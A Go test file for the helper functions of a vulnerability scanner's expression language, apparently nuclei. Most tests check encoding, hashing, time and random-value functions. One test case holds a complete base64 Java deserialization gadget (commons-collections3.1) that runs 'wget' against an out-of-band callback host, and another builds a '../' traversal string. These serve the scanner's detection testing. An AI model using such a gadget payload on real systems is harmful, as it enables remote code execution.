package dsl

import (
	"fmt"
	"math"
	"regexp"
	"strconv"
	"testing"
	"time"

	"github.com/Knetic/govaluate"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/projectdiscovery/nuclei/v2/pkg/types"
)

func TestDSLURLEncodeDecode(t *testing.T) {
	functions := HelperFunctions

	encoded, err := functions["url_encode"]("&test\"")
	require.Nil(t, err, "could not url encode")
	require.Equal(t, "%26test%22", encoded, "could not get url encoded data")

	decoded, err := functions["url_decode"]("%26test%22")
	require.Nil(t, err, "could not url encode")
	require.Equal(t, "&test\"", decoded, "could not get url decoded data")
}

func TestDSLTimeComparison(t *testing.T) {
	compiled, err := govaluate.NewEvaluableExpressionWithFunctions("unixtime() > not_after", HelperFunctions)
	require.Nil(t, err, "could not compare time")

	result, err := compiled.Evaluate(map[string]interface{}{"not_after": float64(time.Now().Unix() - 1000)})
	require.Nil(t, err, "could not evaluate compare time")
	require.Equal(t, true, result, "could not get url encoded data")
}

func TestDSLGzipSerialize(t *testing.T) {
	compiled, err := govaluate.NewEvaluableExpressionWithFunctions("gzip(\"hello world\")", HelperFunctions)
	require.Nil(t, err, "could not compile encoder")

	result, err := compiled.Evaluate(make(map[string]interface{}))
	require.Nil(t, err, "could not evaluate compare time")

	compiled, err = govaluate.NewEvaluableExpressionWithFunctions("gzip_decode(data)", HelperFunctions)
	require.Nil(t, err, "could not compile decoder")

	data, err := compiled.Evaluate(map[string]interface{}{"data": result})
	require.Nil(t, err, "could not evaluate decoded data")

	require.Equal(t, "hello world", data.(string), "could not get gzip encoded data")
}

func TestDslFunctionSignatures(t *testing.T) {
	createSignatureError := func(signature string) string {
		return fmt.Errorf(invalidDslFunctionMessageTemplate, invalidDslFunctionError, signature).Error()
	}

	toUpperSignatureError := createSignatureError("to_upper(arg1 interface{}) interface{}")
	removeBadCharsSignatureError := createSignatureError("remove_bad_chars(arg1, arg2 interface{}) interface{}")

	testCases := []struct {
		methodName string
		arguments  []interface{}
		expected   interface{}
		err        string
	}{
		{"to_upper", []interface{}{}, nil, toUpperSignatureError},
		{"to_upper", []interface{}{"a"}, "A", ""},
		{"toupper", []interface{}{"a"}, "A", ""},
		{"to_upper", []interface{}{"a", "b", "c"}, nil, toUpperSignatureError},

		{"remove_bad_chars", []interface{}{}, nil, removeBadCharsSignatureError},
		{"remove_bad_chars", []interface{}{"a"}, nil, removeBadCharsSignatureError},
		{"remove_bad_chars", []interface{}{"abba baab", "b"}, "aa aa", ""},
		{"remove_bad_chars", []interface{}{"a", "b", "c"}, nil, removeBadCharsSignatureError},
	}

	helperFunctions := HelperFunctions
	for _, currentTestCase := range testCases {
		methodName := currentTestCase.methodName
		t.Run(methodName, func(t *testing.T) {
			actualResult, err := helperFunctions[methodName](currentTestCase.arguments...)

			if currentTestCase.err == "" {
				assert.Nil(t, err)
			} else {
				assert.Equal(t, err.Error(), currentTestCase.err)
			}
			assert.Equal(t, currentTestCase.expected, actualResult)
		})
	}
}

func TestGetPrintableDslFunctionSignatures(t *testing.T) {
	expected := `	aes_cbc(arg1, arg2 interface{}) interface{}
	aes_gcm(arg1, arg2 interface{}) interface{}
	base64(arg1 interface{}) interface{}
	base64_decode(arg1 interface{}) interface{}
	base64_py(arg1 interface{}) interface{}
	bin_to_dec(arg1 interface{}) interface{}
	compare_versions(firstVersion, constraints ...string) bool
	concat(args ...interface{}) string
	contains(arg1, arg2 interface{}) interface{}
	contains_all(body interface{}, substrs ...string) bool
	contains_any(body interface{}, substrs ...string) bool
	date_time(dateTimeFormat string, optionalUnixTime interface{}) string
	dec_to_hex(arg1 interface{}) interface{}
	ends_with(str string, suffix ...string) bool
	generate_java_gadget(arg1, arg2, arg3 interface{}) interface{}
	gzip(arg1 interface{}) interface{}
	gzip_decode(arg1 interface{}) interface{}
	hex_decode(arg1 interface{}) interface{}
	hex_encode(arg1 interface{}) interface{}
	hex_to_dec(arg1 interface{}) interface{}
	hmac(arg1, arg2, arg3 interface{}) interface{}
	html_escape(arg1 interface{}) interface{}
	html_unescape(arg1 interface{}) interface{}
	join(separator string, elements ...interface{}) string
	len(arg1 interface{}) interface{}
	line_ends_with(str string, suffix ...string) bool
	line_starts_with(str string, prefix ...string) bool
	md5(arg1 interface{}) interface{}
	mmh3(arg1 interface{}) interface{}
	oct_to_dec(arg1 interface{}) interface{}
	print_debug(args ...interface{})
	rand_base(length uint, optionalCharSet string) string
	rand_char(optionalCharSet string) string
	rand_int(optionalMin, optionalMax uint) int
	rand_ip(cidr ...string) string
	rand_text_alpha(length uint, optionalBadChars string) string
	rand_text_alphanumeric(length uint, optionalBadChars string) string
	rand_text_numeric(length uint, optionalBadNumbers string) string
	regex(arg1, arg2 interface{}) interface{}
	remove_bad_chars(arg1, arg2 interface{}) interface{}
	repeat(arg1, arg2 interface{}) interface{}
	replace(arg1, arg2, arg3 interface{}) interface{}
	replace_regex(arg1, arg2, arg3 interface{}) interface{}
	reverse(arg1 interface{}) interface{}
	sha1(arg1 interface{}) interface{}
	sha256(arg1 interface{}) interface{}
	sha512(arg1 interface{}) interface{}
	sort(args ...interface{}) interface{}
	starts_with(str string, prefix ...string) bool
	substr(str string, start int, optionalEnd int)
	to_lower(arg1 interface{}) interface{}
	to_number(arg1 interface{}) interface{}
	to_string(arg1 interface{}) interface{}
	to_unix_time(input string, optionalLayout string) int64
	to_upper(arg1 interface{}) interface{}
	trim(arg1, arg2 interface{}) interface{}
	trim_left(arg1, arg2 interface{}) interface{}
	trim_prefix(arg1, arg2 interface{}) interface{}
	trim_right(arg1, arg2 interface{}) interface{}
	trim_space(arg1 interface{}) interface{}
	trim_suffix(arg1, arg2 interface{}) interface{}
	uniq(args ...interface{}) interface{}
	unix_time(optionalSeconds uint) float64
	url_decode(arg1 interface{}) interface{}
	url_encode(arg1 interface{}) interface{}
	wait_for(seconds uint)
	zlib(arg1 interface{}) interface{}
	zlib_decode(arg1 interface{}) interface{}
`

	signatures := GetPrintableDslFunctionSignatures(true)
	assert.Equal(t, expected, signatures)

	coloredSignatures := GetPrintableDslFunctionSignatures(false)
	require.Contains(t, coloredSignatures, `[93maes_cbc[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m`, "could not get colored signatures")
}

func TestDslExpressions(t *testing.T) {

	dslExpressions := map[string]interface{}{
		`base64("Hello")`:                                "SGVsbG8=",
		`base64(1234)`:                                   "MTIzNA==",
		`base64_py("Hello")`:                             "SGVsbG8=\n",
		`hex_encode("aa")`:                               "6161",
		`html_escape("<body>test</body>")`:               "&lt;body&gt;test&lt;/body&gt;",
		`html_unescape("&lt;body&gt;test&lt;/body&gt;")`: "<body>test</body>",
		`md5("Hello")`:                                   "8b1a9953c4611296a827abf8c47804d7",
		`md5(1234)`:                                      "81dc9bdb52d04dc20036dbd8313ed055",
		`mmh3("Hello")`:                                  "316307400",
		`remove_bad_chars("abcd", "bc")`:                 "ad",
		`replace("Hello", "He", "Ha")`:                   "Hallo",
		`concat("Hello", 123, "world")`:                  "Hello123world",
		`join("_", "Hello", 123, "world")`:               "Hello_123_world",
		`repeat("a", 5)`:                                 "aaaaa",
		`repeat("a", "5")`:                               "aaaaa",
		`repeat("../", "5")`:                             "../../../../../",
		`repeat(5, 5)`:                                   "55555",
		`replace_regex("He123llo", "(\\d+)", "")`:        "Hello",
		`reverse("abc")`:                                 "cba",
		`sha1("Hello")`:                                  "f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0",
		`sha256("Hello")`:                                "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969",
		`sha512("Hello")`:                                "3615f80c9d293ed7402687f94b22d58e529b8cc7916f8fac7fddf7fbd5af4cf777d3d795a7a00a16bf7e7f3fb9561ee9baae480da9fe7a18769e71886b03f315",
		`to_lower("HELLO")`:                              "hello",
		`to_upper("hello")`:                              "HELLO",
		`trim("aaaHelloddd", "ad")`:                      "Hello",
		`trim_left("aaaHelloddd", "ad")`:                 "Helloddd",
		`trim_prefix("aaHelloaa", "aa")`:                 "Helloaa",
		`trim_right("aaaHelloddd", "ad")`:                "aaaHello",
		`trim_space("  Hello  ")`:                        "Hello",
		`trim_suffix("aaHelloaa", "aa")`:                 "aaHello",
		`url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")`: "https://projectdiscovery.io?test=1",
		`url_encode("https://projectdiscovery.io/test?a=1")`:     "https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1",
		`gzip("Hello")`: "\x1f\x8b\b\x00\x00\x00\x00\x00\x00\xff\xf2H\xcd\xc9\xc9\a\x04\x00\x00\xff\xff\x82\x89\xd1\xf7\x05\x00\x00\x00",
		`zlib("Hello")`: "\x78\x9c\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff\x05\x8c\x01\xf5",
		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))`:                               "Hello",
		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       "Hello",
		`generate_java_gadget("commons-collections3.1", "wget https://{{interactsh-url}}", "base64")`: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAH3dnZXQgaHR0cHM6Ly97e2ludGVyYWN0c2gtdXJsfX10AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==",
		`base64_decode("SGVsbG8=")`:                               "Hello",
		`hex_decode("6161")`:                                      "aa",
		`len("Hello")`:                                            float64(5),
		`len(1234)`:                                               float64(4),
		`contains("Hello", "lo")`:                                 true,
		`starts_with("Hello", "He")`:                              true,
		`ends_with("Hello", "lo")`:                                true,
		"line_starts_with('Hi\nHello', 'He')":                     true, // back quotes do not support escape sequences
		"line_ends_with('Hii\nHello', 'ii')":                      true, // back quotes do not support escape sequences
		`regex("H([a-z]+)o", "Hello")`:                            true,
		`wait_for(1)`:                                             nil,
		`print_debug(1+2, "Hello")`:                               nil,
		`to_number('4')`:                                          float64(4),
		`to_string(4)`:                                            "4",
		`dec_to_hex(7001)`:                                        "1b59",
		`hex_to_dec("ff")`:                                        float64(255),
		`hex_to_dec("0xff")`:                                      float64(255),
		`oct_to_dec("0o1234567")`:                                 float64(342391),
		`oct_to_dec("1234567")`:                                   float64(342391),
		`oct_to_dec(1234567)`:                                     float64(342391),
		`bin_to_dec("0b1010")`:                                    float64(10),
		`bin_to_dec("1010")`:                                      float64(10),
		`bin_to_dec(1010)`:                                        float64(10),
		`compare_versions('v1.0.0', '<1.1.1')`:                    true,
		`compare_versions('v1.1.1', '>v1.1.0')`:                   true,
		`compare_versions('v1.0.0', '>v0.0.1,<v1.0.1')`:           true,
		`compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')`:        true,
		`hmac('sha1', 'test', 'scrt')`:                            "8856b111056d946d5c6c92a21b43c233596623c6",
		`hmac('sha256', 'test', 'scrt')`:                          "1f1bff5574f18426eb376d6dd5368a754e67a798aa2074644d5e3fd4c90c7a92",
		`hmac('sha512', 'test', 'scrt')`:                          "1d3fff1dbb7369c1615ffb494813146bea051ce07e5d44bdeca539653ea97656bf9d38db264cddbe6a83ea15139c8f861a7e73e10e43ad4865e852a9ee6de2e9",
		`substr('xxtestxxx',2)`:                                   "testxxx",
		`substr('xxtestxxx',2,-2)`:                                "testx",
		`substr('xxtestxxx',2,6)`:                                 "test",
		`sort("a1b2c3d4e5")`:                                      "12345abcde",
		`sort("b", "a", "2", "c", "3", "1", "d", "4")`:            []string{"1", "2", "3", "4", "a", "b", "c", "d"},
		`join(" ", sort("b", "a", "2", "c", "3", "1", "d", "4"))`: "1 2 3 4 a b c d",
		`uniq("abcabdaabbccd")`:                                   "abcd",
		`uniq("ab", "cd", "12", "34", "12", "cd")`:                []string{"ab", "cd", "12", "34"},
		`join(" ", uniq("ab", "cd", "12", "34", "12", "cd"))`:     "ab cd 12 34",
	}

	testDslExpressionScenarios(t, dslExpressions)
}

func Test(t *testing.T) {
	if number, err := strconv.ParseInt("0o1234567", 0, 64); err == nil {
		fmt.Println(number)
	} else {
		fmt.Println(err)
	}
}

func TestDateTimeDSLFunction(t *testing.T) {

	testDateTimeFormat := func(t *testing.T, dateTimeFormat string, dateTimeFunction *govaluate.EvaluableExpression, expectedFormattedTime string, currentUnixTime int64) {
		dslFunctionParameters := map[string]interface{}{"dateTimeFormat": dateTimeFormat}

		if currentUnixTime != 0 {
			dslFunctionParameters["unixTime"] = currentUnixTime
		}

		result, err := dateTimeFunction.Evaluate(dslFunctionParameters)

		require.Nil(t, err, "could not evaluate compare time")

		require.Equal(t, expectedFormattedTime, result.(string), "could not get correct time format string")
	}

	t.Run("with unix time", func(t *testing.T) {
		dateTimeFunction, err := govaluate.NewEvaluableExpressionWithFunctions("date_time(dateTimeFormat)", HelperFunctions)
		require.Nil(t, err, "could not compile encoder")

		currentTime := time.Now()
		expectedFormattedTime := currentTime.Format("02-01-2006 15:04")
		testDateTimeFormat(t, "02-01-2006 15:04", dateTimeFunction, expectedFormattedTime, 0)
		testDateTimeFormat(t, "%D-%M-%Y %H:%m", dateTimeFunction, expectedFormattedTime, 0)
	})

	t.Run("without unix time", func(t *testing.T) {
		dateTimeFunction, err := govaluate.NewEvaluableExpressionWithFunctions("date_time(dateTimeFormat, unixTime)", HelperFunctions)
		require.Nil(t, err, "could not compile encoder")

		currentTime := time.Now()
		currentUnixTime := currentTime.Unix()
		expectedFormattedTime := currentTime.Format("02-01-2006 15:04")
		testDateTimeFormat(t, "02-01-2006 15:04", dateTimeFunction, expectedFormattedTime, currentUnixTime)
		testDateTimeFormat(t, "%D-%M-%Y %H:%m", dateTimeFunction, expectedFormattedTime, currentUnixTime)
	})
}

func TestDateTimeDslExpressions(t *testing.T) {

	t.Run("date_time", func(t *testing.T) {
		now := time.Now()

		dslExpressions := map[string]interface{}{
			`date_time("%Y-%M-%D")`:                fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
			`date_time("%Y-%M-%D", unix_time())`:   fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
			`date_time("%Y-%M-%D", 1642032000)`:    time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("2006-01-02"),
			`date_time("%H-%m")`:                   fmt.Sprintf("%02d-%02d", now.Hour(), now.Minute()),
			`date_time("02-01-2006", unix_time())`: now.Format("02-01-2006"),
			`date_time("02-01-2006", 1642032000)`:  time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("02-01-2006"),
		}

		testDslExpressionScenarios(t, dslExpressions)
	})

	t.Run("to_unix_time(input string) int", func(t *testing.T) {
		expectedUtcTime := time.Date(2022, 01, 13, 16, 30, 10, 0, time.UTC)

		dateTimeInputs := map[string]time.Time{
			// UTC time
			"2022-01-13T16:30:10Z":      expectedUtcTime,
			"2022-01-13T16:30:10+00:00": expectedUtcTime,
			"2022-01-13T16:30:10-00:00": expectedUtcTime,

			// explicit time offset
			"2022-01-13 16:30:10 +01:00": time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+1", 60*60)),
			"2022-01-13 16:30 +01:00":    time.Date(2022, 01, 13, 16, 30, 0, 0, time.FixedZone("UTC+1", 60*60)),
			"2022-01-13 +02:00":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC+2", 2*60*60)),
			"2022-01-13 -02:00":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC+2", -2*60*60)),

			// local time
			"2022-01-13 16:30:10": time.Date(2022, 01, 13, 16, 30, 10, 0, time.Local),
			"2022-01-13 16:30":    time.Date(2022, 01, 13, 16, 30, 0, 0, time.Local),
			"2022-01-13":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.Local),
		}

		for dateTimeInput, expectedTime := range dateTimeInputs {
			dslExpression := fmt.Sprintf(`to_unix_time("%s")`, dateTimeInput)
			t.Run(dslExpression, func(t *testing.T) {
				actual := evaluateExpression(t, dslExpression)
				assert.Equal(t, expectedTime.Unix(), actual)
			})
		}
	})

	t.Run("to_unix_time(input string, layout string) int", func(t *testing.T) {
		testScenarios := []struct {
			inputDateTime string
			layout        string
			expectedTime  time.Time
		}{
			{"2022-01-13T16:30:10+02:00", time.RFC3339, time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+2", 2*60*60))},
			{"13-01-2022 16:30:10", "02-01-2006 15:04:05", time.Date(2022, 01, 13, 16, 30, 10, 0, time.UTC)},
			{"13-01-2022 16:30", "02-01-2006 15:04", time.Date(2022, 01, 13, 16, 30, 0, 0, time.UTC)},
			{"13-01-2022", "02-01-2006", time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC)},

			{"13-01-2022 16:30:10 +02:00", "02-01-2006 15:04:05 Z07:00", time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+2", 2*60*60))},
			{"13-01-2022 16:30 +01:00", "02-01-2006 15:04 Z07:00", time.Date(2022, 01, 13, 16, 30, 0, 0, time.FixedZone("UTC+1", 60*60))},
			{"13-01-2022 -03:30", "02-01-2006 Z07:00", time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC-3:30", -3*60*60-30*60))},
		}

		for _, testScenario := range testScenarios {
			dslExpression := fmt.Sprintf(`to_unix_time("%s", "%s")`, testScenario.inputDateTime, testScenario.layout)
			t.Run(dslExpression, func(t *testing.T) {
				actual := evaluateExpression(t, dslExpression)
				assert.Equal(t, testScenario.expectedTime.Unix(), actual)
			})
		}
	})
}

func TestRandDslExpressions(t *testing.T) {
	randDslExpressions := map[string]string{
		`rand_base(10, "")`:         `[a-zA-Z0-9]{10}`,
		`rand_base(5, "abc")`:       `[abc]{5}`,
		`rand_base(5)`:              `[a-zA-Z0-9]{5}`,
		`rand_char("abc")`:          `[abc]{1}`,
		`rand_char("")`:             `[a-zA-Z0-9]{1}`,
		`rand_char()`:               `[a-zA-Z0-9]{1}`,
		`rand_ip("192.168.0.0/24")`: `(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`,
		`rand_ip("2001:db8::/64")`:  `(?:[A-Fa-f0-9]{0,4}:){0,7}[A-Fa-f0-9]{0,4}$`,

		`rand_text_alpha(10, "abc")`:         `[^abc]{10}`,
		`rand_text_alpha(10, "")`:            `[a-zA-Z]{10}`,
		`rand_text_alpha(10)`:                `[a-zA-Z]{10}`,
		`rand_text_alphanumeric(10, "ab12")`: `[^ab12]{10}`,
		`rand_text_alphanumeric(5, "")`:      `[a-zA-Z0-9]{5}`,
		`rand_text_alphanumeric(10)`:         `[a-zA-Z0-9]{10}`,
		`rand_text_numeric(10, 123)`:         `[^123]{10}`,
		`rand_text_numeric(10)`:              `\d{10}`,
	}

	for randDslExpression, regexTester := range randDslExpressions {
		t.Run(randDslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, randDslExpression)

			compiledTester := regexp.MustCompile(fmt.Sprintf("^%s$", regexTester))

			fmt.Printf("%s: \t %v\n", randDslExpression, actualResult)

			stringResult := types.ToString(actualResult)

			assert.True(t, compiledTester.MatchString(stringResult), "The result '%s' of '%s' expression does not match the expected regex: '%s'", actualResult, randDslExpression, regexTester)
		})
	}
}

func TestRandIntDslExpressions(t *testing.T) {
	randIntDslExpressions := map[string]func(int) bool{
		`rand_int(5, 9)`: func(i int) bool {
			return i >= 5 && i <= 9
		},
		`rand_int(9)`: func(i int) bool {
			return i >= 9
		},
		`rand_int()`: func(i int) bool {
			return i >= 0 && i <= math.MaxInt32
		},
	}

	for randIntDslExpression, tester := range randIntDslExpressions {
		t.Run(randIntDslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, randIntDslExpression)

			actualIntResult := actualResult.(int)
			assert.True(t, tester(actualIntResult), "The '%d' result of the '%s' expression, does not match th expected validation function.", actualIntResult, randIntDslExpression)
		})
	}
}

func evaluateExpression(t *testing.T, dslExpression string) interface{} {
	compiledExpression, err := govaluate.NewEvaluableExpressionWithFunctions(dslExpression, HelperFunctions)
	require.NoError(t, err, "Error while compiling the %q expression", dslExpression)

	actualResult, err := compiledExpression.Evaluate(make(map[string]interface{}))
	require.NoError(t, err, "Error while evaluating the compiled %q expression", dslExpression)

	for _, negativeTestWord := range []string{"panic", "invalid", "error"} {
		require.NotContains(t, fmt.Sprintf("%v", actualResult), negativeTestWord)
	}

	return actualResult
}

func testDslExpressionScenarios(t *testing.T, dslExpressions map[string]interface{}) {
	for dslExpression, expectedResult := range dslExpressions {
		t.Run(dslExpression, func(t *testing.T) {
			actualResult := evaluateExpression(t, dslExpression)

			if expectedResult != nil {
				assert.Equal(t, expectedResult, actualResult)
			}

			fmt.Printf("%s: \t %v\n", dslExpression, actualResult)
		})
	}
}
